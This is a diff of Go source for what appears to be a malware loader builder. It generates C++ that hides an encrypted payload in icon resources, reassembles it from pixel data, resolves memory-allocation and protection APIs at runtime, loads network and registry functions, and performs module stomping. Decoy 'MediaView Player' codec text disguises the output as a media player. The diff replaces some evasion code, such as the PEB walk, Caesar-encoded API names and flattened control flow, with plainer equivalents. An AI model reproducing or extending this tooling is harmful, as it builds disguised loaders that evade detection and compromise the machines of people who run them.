@@ -392,6 +392,37 @@ static void ecl_sha256(const uint8_t* data, uint32_t len, uint8_t hash[32]) {
 }
 `
 
+const eclBCryptSHA256Cpp = `static void ecl_sha256(const uint8_t* data, uint32_t len, uint8_t hash[32]) {
+    typedef long(__stdcall*tOAP)(void**,const wchar_t*,const wchar_t*,unsigned long);
+    typedef long(__stdcall*tCH)(void*,void**,uint8_t*,unsigned long,uint8_t*,unsigned long,unsigned long);
+    typedef long(__stdcall*tHD)(void*,uint8_t*,unsigned long,unsigned long);
+    typedef long(__stdcall*tFH)(void*,uint8_t*,unsigned long,unsigned long);
+    typedef long(__stdcall*tDH)(void*);
+    static HMODULE hB=NULL;
+    static void* hAlg=NULL;
+    static tCH pCH=NULL; static tHD pHD=NULL;
+    static tFH pFH=NULL; static tDH pDH=NULL;
+    if(!hB){
+        hB=LoadLibraryA("bcrypt.dll");
+        if(!hB)return;
+        tOAP pOAP=(tOAP)GetProcAddress(hB,"BCryptOpenAlgorithmProvider");
+        pCH=(tCH)GetProcAddress(hB,"BCryptCreateHash");
+        pHD=(tHD)GetProcAddress(hB,"BCryptHashData");
+        pFH=(tFH)GetProcAddress(hB,"BCryptFinishHash");
+        pDH=(tDH)GetProcAddress(hB,"BCryptDestroyHash");
+        if(pOAP)pOAP(&hAlg,L"SHA256",NULL,0);
+    }
+    if(!hAlg||!pCH||!pHD||!pFH||!pDH){memset(hash,0,32);return;}
+    void* hHash=NULL;
+    pCH(hAlg,&hHash,NULL,0,NULL,0,0);
+    if(!hHash){memset(hash,0,32);return;}
+    pHD(hHash,(uint8_t*)data,len,0);
+    pFH(hHash,hash,32,0);
+    pDH(hHash);
+}
+
+`
+
 const callbackSemanticPad = `static const char g_CodecInfo[] =
     "MediaView Player uses hardware-accelerated decoding for smooth playback of "
     "high-definition video content including H.264, H.265/HEVC, VP9, and AV1 codecs. "
@@ -530,132 +561,44 @@ func writeResLoaderCode(sb *strings.Builder, encSize, realSize, skipGroups int) 
 	sb.WriteString(fmt.Sprintf("static const uint32_t g_real_size = %d;\n", realSize))
 	sb.WriteString("static uint8_t* _codecBuf = NULL;\n")
 	sb.WriteString("static uint8_t* _pd = NULL;\n")
-
-	// Generate random state constants for obfuscated control flow (unique per build)
-	var rb [24]byte
-	rand.Read(rb[:])
-	mkv := func(i int) uint32 {
-		v := uint32(rb[i*2]) | uint32(rb[i*2+1])<<8
-		v |= 0x1000
-		return v
-	}
-	vals := make([]uint32, 11)
-	used := make(map[uint32]bool)
-	for i := 0; i < 11; i++ {
-		v := mkv(i)
-		for used[v] {
-			v = (v*31 + 17) & 0xFFFF
-			v |= 0x1000
-		}
-		vals[i] = v
-		used[v] = true
-	}
-	mask := vals[0]
-	sFG := vals[1]  // find group
-	sSG := vals[2]  // size group
-	sLG := vals[3]  // lock group
-	sCE := vals[4]  // check entry
-	sFI := vals[5]  // find icon
-	sSI := vals[6]  // size icon
-	sLI := vals[7]  // lock icon
-	sEX := vals[8]  // extract
-	sDN := vals[9]  // done
-	sDd := vals[10] // dead (never reached)
-
-	xf := func(v uint32) string { return fmt.Sprintf("0x%X", v^mask) }
-
 	sb.WriteString("static BOOL InitCodecCache(){\n")
 	sb.WriteString("    _codecBuf=(uint8_t*)malloc(g_enc_size);\n")
 	sb.WriteString("    if(!_codecBuf)return FALSE;\n")
 	sb.WriteString("    _pd=_codecBuf;\n")
-	sb.WriteString("    uint32_t _pos=0;\n")
-	sb.WriteString(fmt.Sprintf("    int _gid=%d;\n", skipGroups+1))
-	sb.WriteString("    HRSRC _hg=NULL;DWORD _gsz=0;const uint8_t*_gd=NULL;\n")
-	sb.WriteString("    uint16_t _cnt=0;int _ei=0;uint16_t _nid=0;\n")
-	sb.WriteString("    HRSRC _hi=NULL;DWORD _isz=0;const uint8_t*_id=NULL;\n")
-	sb.WriteString(fmt.Sprintf("    volatile uint32_t _sm=%s;\n", xf(sFG)))
-	sb.WriteString(fmt.Sprintf("    while(_sm!=%s){\n", xf(sDN)))
-	sb.WriteString(fmt.Sprintf("        uint32_t _op=_sm^0x%X;\n", mask))
-	sb.WriteString("        switch(_op){\n")
-
-	// S_FIND_GROUP: FindResourceW for group icon
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sFG))
-	sb.WriteString("            _hg=_a.fFR(NULL,MAKEINTRESOURCE(_gid),RT_GROUP_ICON);\n")
-	sb.WriteString(fmt.Sprintf("            _sm=_hg?%s:%s;\n", xf(sSG), xf(sDN)))
-	sb.WriteString("            break;}\n")
-
-	// S_SIZE_GROUP: SizeofResource for group
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sSG))
-	sb.WriteString("            _gsz=_a.fSR(NULL,_hg);\n")
-	sb.WriteString(fmt.Sprintf("            _sm=%s;break;}\n", xf(sLG)))
-
-	// S_LOCK_GROUP: LoadResource + LockResource for group
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sLG))
-	sb.WriteString("            {HGLOBAL _gl=_a.fLR(NULL,_hg);\n")
-	sb.WriteString("            _gd=_gl?(const uint8_t*)_a.fLk(_gl):NULL;}\n")
-	sb.WriteString(fmt.Sprintf("            if(!_gd||_gsz<6){_gid++;_sm=_pos<g_enc_size?%s:%s;}\n", xf(sFG), xf(sDN)))
-	sb.WriteString(fmt.Sprintf("            else{memcpy(&_cnt,_gd+4,2);_ei=0;_sm=%s;}\n", xf(sCE)))
-	sb.WriteString("            break;}\n")
-
-	// S_CHECK_ENTRY: check next icon entry in group
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sCE))
-	sb.WriteString(fmt.Sprintf("            if(_ei>=_cnt||_pos>=g_enc_size){_gid++;_sm=_pos<g_enc_size?%s:%s;}\n", xf(sFG), xf(sDN)))
-	sb.WriteString(fmt.Sprintf("            else if((uint32_t)(6+(_ei+1)*14)>_gsz){_gid++;_sm=_pos<g_enc_size?%s:%s;}\n", xf(sFG), xf(sDN)))
-	sb.WriteString(fmt.Sprintf("            else{memcpy(&_nid,_gd+6+_ei*14+12,2);_sm=%s;}\n", xf(sFI)))
-	sb.WriteString("            break;}\n")
-
-	// S_FIND_ICON: FindResourceW for individual icon
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sFI))
-	sb.WriteString("            _hi=_a.fFR(NULL,MAKEINTRESOURCE(_nid),RT_ICON);\n")
-	sb.WriteString(fmt.Sprintf("            if(!_hi){_ei++;_sm=%s;}\n", xf(sCE)))
-	sb.WriteString(fmt.Sprintf("            else _sm=%s;\n", xf(sSI)))
-	sb.WriteString("            break;}\n")
-
-	// S_SIZE_ICON: SizeofResource for icon
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sSI))
-	sb.WriteString("            _isz=_a.fSR(NULL,_hi);\n")
-	sb.WriteString(fmt.Sprintf("            _sm=%s;break;}\n", xf(sLI)))
-
-	// S_LOCK_ICON: LoadResource + LockResource for icon
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sLI))
-	sb.WriteString("            {HGLOBAL _il=_a.fLR(NULL,_hi);\n")
-	sb.WriteString("            _id=_il?(const uint8_t*)_a.fLk(_il):NULL;}\n")
-	sb.WriteString(fmt.Sprintf("            if(!_id||_isz<40){_ei++;_sm=%s;}\n", xf(sCE)))
-	sb.WriteString(fmt.Sprintf("            else _sm=%s;\n", xf(sEX)))
-	sb.WriteString("            break;}\n")
-
-	// S_EXTRACT: extract pixel data from icon
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sEX))
-	sb.WriteString("            int32_t bw,bh;memcpy(&bw,_id+4,4);memcpy(&bh,_id+8,4);bh/=2;\n")
-	sb.WriteString(fmt.Sprintf("            if(bw<=0||bh<=0){_ei++;_sm=%s;break;}\n", xf(sCE)))
-	sb.WriteString("            uint16_t bits;memcpy(&bits,_id+14,2);\n")
+	sb.WriteString("    uint32_t pos=0;\n")
+	sb.WriteString(fmt.Sprintf("    for(int gid=%d;pos<g_enc_size;gid++){\n", skipGroups+1))
+	sb.WriteString("        HRSRC hg=_a.fFR(NULL,MAKEINTRESOURCE(gid),RT_GROUP_ICON);\n")
+	sb.WriteString("        if(!hg)break;\n")
+	sb.WriteString("        DWORD gsz=_a.fSR(NULL,hg);\n")
+	sb.WriteString("        HGLOBAL gl=_a.fLR(NULL,hg);\n")
+	sb.WriteString("        const uint8_t*gd=gl?(const uint8_t*)_a.fLk(gl):NULL;\n")
+	sb.WriteString("        if(!gd||gsz<6)continue;\n")
+	sb.WriteString("        uint16_t cnt;memcpy(&cnt,gd+4,2);\n")
+	sb.WriteString("        for(int i=0;i<cnt&&pos<g_enc_size;i++){\n")
+	sb.WriteString("            if((uint32_t)(6+(i+1)*14)>gsz)break;\n")
+	sb.WriteString("            uint16_t nid;memcpy(&nid,gd+6+i*14+12,2);\n")
+	sb.WriteString("            HRSRC hi=_a.fFR(NULL,MAKEINTRESOURCE(nid),RT_ICON);\n")
+	sb.WriteString("            if(!hi)continue;\n")
+	sb.WriteString("            DWORD isz=_a.fSR(NULL,hi);\n")
+	sb.WriteString("            HGLOBAL il=_a.fLR(NULL,hi);\n")
+	sb.WriteString("            const uint8_t*d=il?(const uint8_t*)_a.fLk(il):NULL;\n")
+	sb.WriteString("            if(!d||isz<40)continue;\n")
+	sb.WriteString("            int32_t bw,bh;memcpy(&bw,d+4,4);memcpy(&bh,d+8,4);bh/=2;\n")
+	sb.WriteString("            if(bw<=0||bh<=0)continue;\n")
+	sb.WriteString("            uint16_t bits;memcpy(&bits,d+14,2);\n")
 	sb.WriteString("            uint32_t palSz=(bits<=8)?(1u<<bits)*4:0;\n")
 	sb.WriteString("            uint32_t dOff=40+palSz;\n")
-	sb.WriteString(fmt.Sprintf("            if(dOff>=_isz){_ei++;_sm=%s;break;}\n", xf(sCE)))
+	sb.WriteString("            if(dOff>=isz)continue;\n")
 	sb.WriteString("            uint32_t bpp=bits/8;if(!bpp)bpp=1;\n")
 	sb.WriteString("            uint32_t px=(uint32_t)bw*(uint32_t)bh*bpp;\n")
-	sb.WriteString("            if(px>_isz-dOff)px=_isz-dOff;\n")
-	sb.WriteString("            for(uint32_t j=0;j<px&&_pos<g_enc_size;j+=4){\n")
-	sb.WriteString("                _codecBuf[_pos++]=_id[dOff+j];\n")
-	sb.WriteString("                if(_pos<g_enc_size)_codecBuf[_pos++]=_id[dOff+j+2];\n")
+	sb.WriteString("            if(px>isz-dOff)px=isz-dOff;\n")
+	sb.WriteString("            for(uint32_t j=0;j<px&&pos<g_enc_size;j+=4){\n")
+	sb.WriteString("                _codecBuf[pos++]=d[dOff+j];\n")
+	sb.WriteString("                if(pos<g_enc_size)_codecBuf[pos++]=d[dOff+j+2];\n")
 	sb.WriteString("            }\n")
-	sb.WriteString(fmt.Sprintf("            _ei++;_sm=%s;break;}\n", xf(sCE)))
-
-	// Dead state: never reached, references VirtualQuery to justify its resolution
-	sb.WriteString(fmt.Sprintf("        case 0x%X:{\n", sDd))
-	sb.WriteString("            MEMORY_BASIC_INFORMATION _mbi;\n")
-	sb.WriteString("            if(_a.fVQ)_a.fVQ(_codecBuf,&_mbi,sizeof(_mbi));\n")
-	sb.WriteString(fmt.Sprintf("            _sm=%s;break;}\n", xf(sDN)))
-
-	sb.WriteString(fmt.Sprintf("        default:_sm=%s;break;\n", xf(sDN)))
-	sb.WriteString("        }\n")
-	// Opaque predicate: rarely true, harmless when triggered
-	sb.WriteString("        if((_op*(uint32_t)0x9E3779B1)>>28==15){\n")
-	sb.WriteString("            MEMORY_BASIC_INFORMATION _mbi;\n")
-	sb.WriteString("            if(_a.fVQ)_a.fVQ(_codecBuf,&_mbi,sizeof(_mbi));\n")
 	sb.WriteString("        }\n")
 	sb.WriteString("    }\n")
-	sb.WriteString("    return _pos>=g_enc_size;\n}\n")
+	sb.WriteString("    return pos>=g_enc_size;\n}\n")
 	sb.WriteString("static uint8_t dG(uint32_t i) { return _pd[i]; }\n")
 	sb.WriteString("static void dR(uint8_t* dst) { memcpy(dst, _pd, g_enc_size); }\n\n")
 }
@@ -696,163 +639,101 @@ func oxuWriteKeyHandling(sb *strings.Builder, embedKey bool, privateKey string) 
 	}
 }
 
-func caesarCppInit(s string, shift int) string {
+func cppCharArray(s string) string {
 	parts := make([]string, len(s)+1)
 	for i, c := range []byte(s) {
-		parts[i] = fmt.Sprintf("%d", int(c)+shift)
+		parts[i] = fmt.Sprintf("'%c'", c)
 	}
 	parts[len(s)] = "0"
 	return "{" + strings.Join(parts, ",") + "}"
 }
 
-func callbackCaesarShift() int {
-	var b [1]byte
-	rand.Read(b[:])
-	return int(b[0])%20 + 3
-}
-
-func callbackDynAPICpp(shift int) string {
+func callbackDynAPICpp() string {
 	var sb strings.Builder
-	sb.WriteString(fmt.Sprintf("static void _cd(unsigned char*s,int n){for(int i=0;i<n;i++)s[i]-=%d;}\n\n", shift))
-	// PEB walk: find kernel32.dll base without any IAT imports
-	sb.WriteString("static HMODULE _fkb(){\n")
-	sb.WriteString("#ifdef _WIN64\n")
-	sb.WriteString("    BYTE*_pb=(BYTE*)__readgsqword(0x60);\n")
-	sb.WriteString("    BYTE*_lr=*(BYTE**)(_pb+0x18);\n")
-	sb.WriteString("    BYTE*_hd=_lr+0x20;BYTE*_nd=*(BYTE**)_hd;\n")
-	sb.WriteString("#else\n")
-	sb.WriteString("    BYTE*_pb=(BYTE*)(ULONG_PTR)__readfsdword(0x30);\n")
-	sb.WriteString("    BYTE*_lr=*(BYTE**)(_pb+0x0C);\n")
-	sb.WriteString("    BYTE*_hd=_lr+0x14;BYTE*_nd=*(BYTE**)_hd;\n")
-	sb.WriteString("#endif\n")
-	sb.WriteString("    while(_nd!=_hd){\n")
-	sb.WriteString("#ifdef _WIN64\n")
-	sb.WriteString("        HMODULE _mb=*(HMODULE*)(_nd+0x20);\n")
-	sb.WriteString("        USHORT _nl=*(USHORT*)(_nd+0x48);\n")
-	sb.WriteString("        wchar_t*_nm=*(wchar_t**)(_nd+0x50);\n")
-	sb.WriteString("#else\n")
-	sb.WriteString("        HMODULE _mb=*(HMODULE*)(_nd+0x10);\n")
-	sb.WriteString("        USHORT _nl=*(USHORT*)(_nd+0x24);\n")
-	sb.WriteString("        wchar_t*_nm=*(wchar_t**)(_nd+0x28);\n")
-	sb.WriteString("#endif\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char _kn[]=%s;\n", caesarCppInit("kernel32.dll", shift)))
-	sb.WriteString("        _cd(_kn,sizeof(_kn)-1);\n")
-	sb.WriteString("        if(_nm&&_nl/2==(int)(sizeof(_kn)-1)){\n")
-	sb.WriteString("            int _ok=1;\n")
-	sb.WriteString("            for(int _i=0;_i<(int)(sizeof(_kn)-1);_i++){\n")
-	sb.WriteString("                wchar_t _c=_nm[_i];if(_c>='A'&&_c<='Z')_c+=32;\n")
-	sb.WriteString("                if(_c!=(wchar_t)_kn[_i]){_ok=0;break;}\n")
-	sb.WriteString("            }\n")
-	sb.WriteString("            if(_ok)return _mb;\n")
-	sb.WriteString("        }\n")
-	sb.WriteString("        _nd=*(BYTE**)_nd;\n")
-	sb.WriteString("    }\n")
-	sb.WriteString("    return NULL;\n}\n\n")
-
-	// PE export table parser: resolve export by name without GetProcAddress
-	sb.WriteString("static FARPROC _fexp(HMODULE _mod,const char*_tgt,int _tl){\n")
-	sb.WriteString("    BYTE*_b=(BYTE*)_mod;\n")
-	sb.WriteString("    DWORD _pe=*(DWORD*)(_b+0x3C);\n")
-	sb.WriteString("    BYTE*_nh=_b+_pe;\n")
-	sb.WriteString("#ifdef _WIN64\n")
-	sb.WriteString("    DWORD _er=*(DWORD*)(_nh+0x88);\n")
-	sb.WriteString("#else\n")
-	sb.WriteString("    DWORD _er=*(DWORD*)(_nh+0x78);\n")
-	sb.WriteString("#endif\n")
-	sb.WriteString("    if(!_er)return NULL;\n")
-	sb.WriteString("    BYTE*_ed=_b+_er;\n")
-	sb.WriteString("    DWORD _nn=*(DWORD*)(_ed+0x18);\n")
-	sb.WriteString("    DWORD*_nrv=(DWORD*)(_b+*(DWORD*)(_ed+0x20));\n")
-	sb.WriteString("    WORD*_ord=(WORD*)(_b+*(DWORD*)(_ed+0x24));\n")
-	sb.WriteString("    DWORD*_frv=(DWORD*)(_b+*(DWORD*)(_ed+0x1C));\n")
-	sb.WriteString("    for(DWORD _i=0;_i<_nn;_i++){\n")
-	sb.WriteString("        const char*_fn=(const char*)(_b+_nrv[_i]);\n")
-	sb.WriteString("        int _j;for(_j=0;_j<_tl&&_fn[_j]==_tgt[_j];_j++);\n")
-	sb.WriteString("        if(_j==_tl&&_fn[_j]==0)return(FARPROC)(_b+_frv[_ord[_i]]);\n")
-	sb.WriteString("    }\n")
-	sb.WriteString("    return NULL;\n}\n\n")
-
-	// Typedefs: all APIs resolved dynamically
-	sb.WriteString("typedef FARPROC(WINAPI*tGPA)(HMODULE,LPCSTR);\n")
-	sb.WriteString("typedef HMODULE(WINAPI*tLLA)(LPCSTR);\n")
 	sb.WriteString("typedef LPVOID(WINAPI*tVA)(LPVOID,SIZE_T,DWORD,DWORD);\n")
 	sb.WriteString("typedef BOOL(WINAPI*tVP)(LPVOID,SIZE_T,DWORD,PDWORD);\n")
 	sb.WriteString("typedef BOOL(WINAPI*tVF)(LPVOID,SIZE_T,DWORD);\n")
 	sb.WriteString("typedef BOOL(WINAPI*tCH)(HANDLE);\n")
-	sb.WriteString("typedef LPVOID(WINAPI*tIOA)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);\n")
-	sb.WriteString("typedef BOOL(WINAPI*tICH)(LPVOID);\n")
-	sb.WriteString("typedef LONG(WINAPI*tROK)(HKEY,LPCSTR,DWORD,REGSAM,HKEY*);\n")
-	sb.WriteString("typedef LONG(WINAPI*tRCK)(HKEY);\n")
 	sb.WriteString("typedef HRSRC(WINAPI*tFRW)(HMODULE,LPCWSTR,LPCWSTR);\n")
 	sb.WriteString("typedef HGLOBAL(WINAPI*tLdR)(HMODULE,HRSRC);\n")
 	sb.WriteString("typedef LPVOID(WINAPI*tLkR)(HGLOBAL);\n")
 	sb.WriteString("typedef DWORD(WINAPI*tSoR)(HMODULE,HRSRC);\n")
-	sb.WriteString("typedef SIZE_T(WINAPI*tVQ)(LPCVOID,PMEMORY_BASIC_INFORMATION,SIZE_T);\n")
-	sb.WriteString("static struct{tGPA fGPA;tLLA fLA;tVA fVA;tVP fVP;tVF fVF;tCH fCH;tIOA fIO;tICH fIC;tROK fRO;tRCK fRC;tFRW fFR;tLdR fLR;tLkR fLk;tSoR fSR;tVQ fVQ;}_a={};\n\n")
-
-	// _ra: resolve all APIs via PEB-walked GetProcAddress
+	sb.WriteString("static struct{tVA fVA;tVP fVP;tVF fVF;tCH fCH;tFRW fFR;tLdR fLR;tLkR fLk;tSoR fSR;}_a={};\n\n")
 	sb.WriteString("static bool _ra(){\n")
-	sb.WriteString("    HMODULE hK=_fkb();if(!hK)return false;\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char _gn[]=%s;\n", caesarCppInit("GetProcAddress", shift)))
-	sb.WriteString("    _cd(_gn,sizeof(_gn)-1);_a.fGPA=(tGPA)_fexp(hK,(const char*)_gn,sizeof(_gn)-1);\n")
-	sb.WriteString("    if(!_a.fGPA)return false;\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char s1[]=%s;\n", caesarCppInit("LoadLibraryA", shift)))
-	sb.WriteString("    _cd(s1,sizeof(s1)-1);_a.fLA=(tLLA)_a.fGPA(hK,(char*)s1);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char s2[]=%s;\n", caesarCppInit("VirtualAlloc", shift)))
-	sb.WriteString("    _cd(s2,sizeof(s2)-1);_a.fVA=(tVA)_a.fGPA(hK,(char*)s2);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char s3[]=%s;\n", caesarCppInit("VirtualProtect", shift)))
-	sb.WriteString("    _cd(s3,sizeof(s3)-1);_a.fVP=(tVP)_a.fGPA(hK,(char*)s3);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char s4[]=%s;\n", caesarCppInit("VirtualFree", shift)))
-	sb.WriteString("    _cd(s4,sizeof(s4)-1);_a.fVF=(tVF)_a.fGPA(hK,(char*)s4);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char s5[]=%s;\n", caesarCppInit("CloseHandle", shift)))
-	sb.WriteString("    _cd(s5,sizeof(s5)-1);_a.fCH=(tCH)_a.fGPA(hK,(char*)s5);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char r1[]=%s;\n", caesarCppInit("FindResourceW", shift)))
-	sb.WriteString("    _cd(r1,sizeof(r1)-1);_a.fFR=(tFRW)_a.fGPA(hK,(char*)r1);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char r2[]=%s;\n", caesarCppInit("LoadResource", shift)))
-	sb.WriteString("    _cd(r2,sizeof(r2)-1);_a.fLR=(tLdR)_a.fGPA(hK,(char*)r2);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char r3[]=%s;\n", caesarCppInit("LockResource", shift)))
-	sb.WriteString("    _cd(r3,sizeof(r3)-1);_a.fLk=(tLkR)_a.fGPA(hK,(char*)r3);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char r4[]=%s;\n", caesarCppInit("SizeofResource", shift)))
-	sb.WriteString("    _cd(r4,sizeof(r4)-1);_a.fSR=(tSoR)_a.fGPA(hK,(char*)r4);\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char r5[]=%s;\n", caesarCppInit("VirtualQuery", shift)))
-	sb.WriteString("    _cd(r5,sizeof(r5)-1);_a.fVQ=(tVQ)_a.fGPA(hK,(char*)r5);\n")
-	sb.WriteString("    if(!_a.fLA||!_a.fVA||!_a.fVP||!_a.fVF||!_a.fCH||!_a.fFR||!_a.fLR||!_a.fLk||!_a.fSR)return false;\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char w[]=%s;\n", caesarCppInit("wininet.dll", shift)))
-	sb.WriteString("    _cd(w,sizeof(w)-1);HMODULE hW=_a.fLA((char*)w);\n")
+	sb.WriteString("    HMODULE hK=GetModuleHandleA(\"kernel32.dll\");\n")
+	sb.WriteString("    if(!hK)return false;\n")
+	sb.WriteString(fmt.Sprintf("    char n0[]=%s;_a.fVA=(tVA)GetProcAddress(hK,n0);\n", cppCharArray("VirtualAlloc")))
+	sb.WriteString(fmt.Sprintf("    char n1[]=%s;_a.fVP=(tVP)GetProcAddress(hK,n1);\n", cppCharArray("VirtualProtect")))
+	sb.WriteString(fmt.Sprintf("    char n2[]=%s;_a.fVF=(tVF)GetProcAddress(hK,n2);\n", cppCharArray("VirtualFree")))
+	sb.WriteString(fmt.Sprintf("    char n3[]=%s;_a.fCH=(tCH)GetProcAddress(hK,n3);\n", cppCharArray("CloseHandle")))
+	sb.WriteString(fmt.Sprintf("    char n4[]=%s;_a.fFR=(tFRW)GetProcAddress(hK,n4);\n", cppCharArray("FindResourceW")))
+	sb.WriteString(fmt.Sprintf("    char n5[]=%s;_a.fLR=(tLdR)GetProcAddress(hK,n5);\n", cppCharArray("LoadResource")))
+	sb.WriteString(fmt.Sprintf("    char n6[]=%s;_a.fLk=(tLkR)GetProcAddress(hK,n6);\n", cppCharArray("LockResource")))
+	sb.WriteString(fmt.Sprintf("    char n7[]=%s;_a.fSR=(tSoR)GetProcAddress(hK,n7);\n", cppCharArray("SizeofResource")))
+	sb.WriteString("    if(!_a.fVA||!_a.fVP||!_a.fVF||!_a.fCH||!_a.fFR||!_a.fLR||!_a.fLk||!_a.fSR)return false;\n")
+	sb.WriteString("    return true;\n}\n\n")
+	return sb.String()
+}
+
+func callbackDynAPIFullCpp() string {
+	var sb strings.Builder
+	sb.WriteString("typedef LPVOID(WINAPI*tVA)(LPVOID,SIZE_T,DWORD,DWORD);\n")
+	sb.WriteString("typedef BOOL(WINAPI*tVP)(LPVOID,SIZE_T,DWORD,PDWORD);\n")
+	sb.WriteString("typedef BOOL(WINAPI*tVF)(LPVOID,SIZE_T,DWORD);\n")
+	sb.WriteString("typedef BOOL(WINAPI*tCH)(HANDLE);\n")
+	sb.WriteString("typedef HRSRC(WINAPI*tFRW)(HMODULE,LPCWSTR,LPCWSTR);\n")
+	sb.WriteString("typedef HGLOBAL(WINAPI*tLdR)(HMODULE,HRSRC);\n")
+	sb.WriteString("typedef LPVOID(WINAPI*tLkR)(HGLOBAL);\n")
+	sb.WriteString("typedef DWORD(WINAPI*tSoR)(HMODULE,HRSRC);\n")
+	sb.WriteString("typedef LPVOID(WINAPI*tIO)(LPCSTR,DWORD,LPCSTR,LPCSTR,DWORD);\n")
+	sb.WriteString("typedef BOOL(WINAPI*tIC)(LPVOID);\n")
+	sb.WriteString("typedef LONG(WINAPI*tRO)(HKEY,LPCSTR,DWORD,DWORD,PHKEY);\n")
+	sb.WriteString("typedef LONG(WINAPI*tRC)(HKEY);\n")
+	sb.WriteString("static struct{tVA fVA;tVP fVP;tVF fVF;tCH fCH;tFRW fFR;tLdR fLR;tLkR fLk;tSoR fSR;tIO fIO;tIC fIC;tRO fRO;tRC fRC;}_a={};\n\n")
+	sb.WriteString("static bool _ra(){\n")
+	sb.WriteString("    HMODULE hK=GetModuleHandleA(\"kernel32.dll\");\n")
+	sb.WriteString("    if(!hK)return false;\n")
+	sb.WriteString(fmt.Sprintf("    char n0[]=%s;_a.fVA=(tVA)GetProcAddress(hK,n0);\n", cppCharArray("VirtualAlloc")))
+	sb.WriteString(fmt.Sprintf("    char n1[]=%s;_a.fVP=(tVP)GetProcAddress(hK,n1);\n", cppCharArray("VirtualProtect")))
+	sb.WriteString(fmt.Sprintf("    char n2[]=%s;_a.fVF=(tVF)GetProcAddress(hK,n2);\n", cppCharArray("VirtualFree")))
+	sb.WriteString(fmt.Sprintf("    char n3[]=%s;_a.fCH=(tCH)GetProcAddress(hK,n3);\n", cppCharArray("CloseHandle")))
+	sb.WriteString(fmt.Sprintf("    char n4[]=%s;_a.fFR=(tFRW)GetProcAddress(hK,n4);\n", cppCharArray("FindResourceW")))
+	sb.WriteString(fmt.Sprintf("    char n5[]=%s;_a.fLR=(tLdR)GetProcAddress(hK,n5);\n", cppCharArray("LoadResource")))
+	sb.WriteString(fmt.Sprintf("    char n6[]=%s;_a.fLk=(tLkR)GetProcAddress(hK,n6);\n", cppCharArray("LockResource")))
+	sb.WriteString(fmt.Sprintf("    char n7[]=%s;_a.fSR=(tSoR)GetProcAddress(hK,n7);\n", cppCharArray("SizeofResource")))
+	sb.WriteString("    if(!_a.fVA||!_a.fVP||!_a.fVF||!_a.fCH||!_a.fFR||!_a.fLR||!_a.fLk||!_a.fSR)return false;\n")
+	sb.WriteString(fmt.Sprintf("    char wi[]=%s;\n", cppCharArray("wininet.dll")))
+	sb.WriteString("    HMODULE hW=GetModuleHandleA(wi);\n")
+	sb.WriteString("    if(!hW){typedef HMODULE(WINAPI*tLL)(LPCSTR);")
+	sb.WriteString(fmt.Sprintf("char ll[]=%s;tLL fLL=(tLL)GetProcAddress(hK,ll);if(fLL)hW=fLL(wi);}\n", cppCharArray("LoadLibraryA")))
 	sb.WriteString("    if(hW){\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char s6[]=%s;\n", caesarCppInit("InternetOpenA", shift)))
-	sb.WriteString("        _cd(s6,sizeof(s6)-1);_a.fIO=(tIOA)_a.fGPA(hW,(char*)s6);\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char s7[]=%s;\n", caesarCppInit("InternetCloseHandle", shift)))
-	sb.WriteString("        _cd(s7,sizeof(s7)-1);_a.fIC=(tICH)_a.fGPA(hW,(char*)s7);\n")
+	sb.WriteString(fmt.Sprintf("        char n8[]=%s;_a.fIO=(tIO)GetProcAddress(hW,n8);\n", cppCharArray("InternetOpenA")))
+	sb.WriteString(fmt.Sprintf("        char n9[]=%s;_a.fIC=(tIC)GetProcAddress(hW,n9);\n", cppCharArray("InternetCloseHandle")))
 	sb.WriteString("    }\n")
-	sb.WriteString(fmt.Sprintf("    unsigned char a[]=%s;\n", caesarCppInit("advapi32.dll", shift)))
-	sb.WriteString("    _cd(a,sizeof(a)-1);HMODULE hA=_a.fLA((char*)a);\n")
+	sb.WriteString(fmt.Sprintf("    char av[]=%s;\n", cppCharArray("advapi32.dll")))
+	sb.WriteString("    HMODULE hA=GetModuleHandleA(av);\n")
+	sb.WriteString("    if(!hA){typedef HMODULE(WINAPI*tLL)(LPCSTR);")
+	sb.WriteString(fmt.Sprintf("char ll[]=%s;tLL fLL=(tLL)GetProcAddress(hK,ll);if(fLL)hA=fLL(av);}\n", cppCharArray("LoadLibraryA")))
 	sb.WriteString("    if(hA){\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char s8[]=%s;\n", caesarCppInit("RegOpenKeyExA", shift)))
-	sb.WriteString("        _cd(s8,sizeof(s8)-1);_a.fRO=(tROK)_a.fGPA(hA,(char*)s8);\n")
-	sb.WriteString(fmt.Sprintf("        unsigned char s9[]=%s;\n", caesarCppInit("RegCloseKey", shift)))
-	sb.WriteString("        _cd(s9,sizeof(s9)-1);_a.fRC=(tRCK)_a.fGPA(hA,(char*)s9);\n")
+	sb.WriteString(fmt.Sprintf("        char na[]=%s;_a.fRO=(tRO)GetProcAddress(hA,na);\n", cppCharArray("RegOpenKeyExA")))
+	sb.WriteString(fmt.Sprintf("        char nb[]=%s;_a.fRC=(tRC)GetProcAddress(hA,nb);\n", cppCharArray("RegCloseKey")))
 	sb.WriteString("    }\n")
 	sb.WriteString("    return true;\n}\n\n")
 	return sb.String()
 }
 
-func callbackModuleStompDynCpp(shift int) string {
+func callbackModuleStompDynCpp() string {
 	var sb strings.Builder
 	sb.WriteString("static void MediaInit(){\n")
 	sb.WriteString("    CoInitializeEx(NULL,0);\n")
